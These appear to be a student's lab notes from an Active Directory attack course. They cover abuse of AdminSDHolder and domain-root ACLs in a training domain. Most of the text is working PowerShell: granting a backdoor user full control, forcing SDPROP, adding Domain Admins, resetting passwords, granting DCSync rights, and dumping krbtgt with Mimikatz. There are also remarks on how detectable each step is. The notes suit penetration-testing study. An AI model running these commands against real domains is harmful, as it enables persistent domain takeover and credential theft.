
The `AdminSDHolder` resides in the System container of a domain and used to control the permissions (using ACL) for certain built-in privileged groups (called protected groups).

Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and memebers with the ACL of `AdminSDHolder` and any differences are overwritten on the object ACL.

>[!Note]
>Every change we do into the ACL of a protected group (for example `Domain Admins`) is usable at most for 1 hour.
>This because each hour the AdminSDHolder will rewrite the ACLs of the protected groups.

The protected groups are:
- ![[Pasted image 20261124153037.png]]


We have well known abuse of some of the protected groups.
All of the below can log on locally to DC.
- ![[Pasted image 20261124153337.png]]


## What AdminSDHolder does?
Every hour a security propagation is run.

The rules contained into The `AdminSDHolder` are applied and so the `ACLs` of the ped groups are re-written following the rules into `AdminSDHolder`:
- ![[Pasted image 20261124154617.png]]

So each change we do uìon protected groups is valid at max 1 hour.

To understand we can also run SD propagator manually:
```powershell
$sess = New-PSSession -Computername dcorp-dc

Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-SDPropagator.ps1

Invoke-Command -ScriptBlock{Invoke-SDPropagator -showProgress -verbose -timeoutMinutes 1} -Session $sess
```
- ![[Pasted image 20261124155150.png]]

We can see in `Domain Admins` that `student1` is not anymore in it:
- ![[Pasted image 20261124155222.png]]



## What we can do to gain privileges with AdminSDHolder
What we can do if we have `Domain Admin` privileges is:
- Go to `AdminSDHolder` and add a permission into it and add all the permissions into the Security section
- ![[Pasted image 20261124172310.png]]

When the permissions are propagated we can find our user in each `Protected Group` on which `AdminSDHolder` applies.
- ![[Pasted image 20261124172448.png]]



## 1. Exploit our permissions to add the user on `AdminSDHolder`

With Domain Admin privileges (Full control / write permissions) on the `AdminSDHolder` object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions to the AdminSDHolder object.
- In 60 mins 8when SDPROP runs), the user will be added with Full Control to the AC of groups like `Domain Admins` without actually being a member of it.


To add a FullControl permission for a user to `AdminSDHolder` using PowerView as `Domain Admin` we can execute:
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorpp,dc=local' -PrincipalIdentity student555 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -targetDomain dollarcorp.moneycorp.local -Verbose
```

>[!note] 
>We can also use AD module and RACE toolkit [https://github.com/samratashok/RACE].
>```powershell
Set-DCPermissions -Method AdminSDHoler -SAMAccountName student555 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorpp,dc=local' -Verbose ```



### 1.1 Force propagation of `AdminSDHolder`

To force the propagation of the permissions of the `AdminSDHolder` we can run:
```powershell
Invoke-SDPropagator taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

>[!note] For pre-server 2008 machines
>```powershell
>Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
>```

### 1.2 Check the result

Now we can check the result.

To check the `Domain Admins` permission (as normal user with powerview):

```powershell
Get-DomainObjectAcl -identity 'Domain Admins' -ResolveGUIDs | foreach-object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_} | ?{$_.IdentityName -match "student555"}
```

>[!Note] with AD module 
>```powershell
>(Get-Acl -Path 'AD:\CN=Domain Admins, CN=Users,DC=dollarcorp,Dc=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student555'}
>```



>[!warning] Is this osec safe?
>Not at all because there are a lot of changes into the ACLs


# 1.3 Abuse the fullcontrol permissions we got to make changes on Domain 

### 2.2.1 Add a new user to `Domain Admins`
We can abuse the `FullControl` permissions we obtained before to execute changes on the domains (add users to domain admins, change passwords etc).

For example to add a user in `Domain Admins`:
```powershell
Add-DomainGroupMemeber -Identity `Domain Admins` -Members tesda -Verbose
```

>[!note] Using ADModule
>```powershell
 Add-ADGroupMemeber -Identity `Domain Admins` -Members tesda
>```

### 1.3.1 Abusing to reset password
to reset a password we can run:
```powershell
Set-DomainUserPassword -identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -verbose
```


>[!note] Using ADModule
>```powershell
Set-ADAccountPassword -identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -verbose
>```



# 2. Abuse Rights

In a Domain there are even more interesting ACLS which can be abused.
- For example, with DA privileges, the ACL for the domain root can be modified to provide useful rights like `fullcontrol` or the ability to run `DCSync`.

The idea id to change the `ACL` of the domain it self:
- ![[Pasted image 20261125100102.png]]

For example we can add our ussername (`student555`) into thhis ACL with Fullcontrol permission. This will allow the user to make changes over the object of the domain.

To be able to run `DCSync` attack we just need 2 permissions on the ACL of the domain:
- `Replicating Directory Changes` and `replicating directory changes all` (allow).

> [!warning] Every change in this ACL is logged, so this attack is very visible.

## 2.1 Add rights to execute `DCSync`
We can add the permissions to run `DCsync` if we have `domain admin` privileges:

```powershell
Add-DomainObjectAcl -targetIdentity 'DC=dollarcorp, DC=moneycorp, DC=local' -PrincipalIdentity student555 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -targetDomain dollarcorp.moneycorp.local -verbose
```


>[!note] ADMudule
>```powershell
>Set-ADAcl -SamAccountName student555 -DistinguishedName 'DC=dollarcorp, DC=moneycorp, DC=local' -GUIDRight DCSync -verbose
>```

### 2.1.1
From now we can run `DCSync:
```powershell
Invoke-Mimikatz -Command '"lsadump:dcsync /user:dcorp\krbtgt"'
```

Or:
```powershell
C:\AD\Tools\Safetykatz.exe "lsadump:dcsync /user:dcorp\krbtgt" "exit"
```
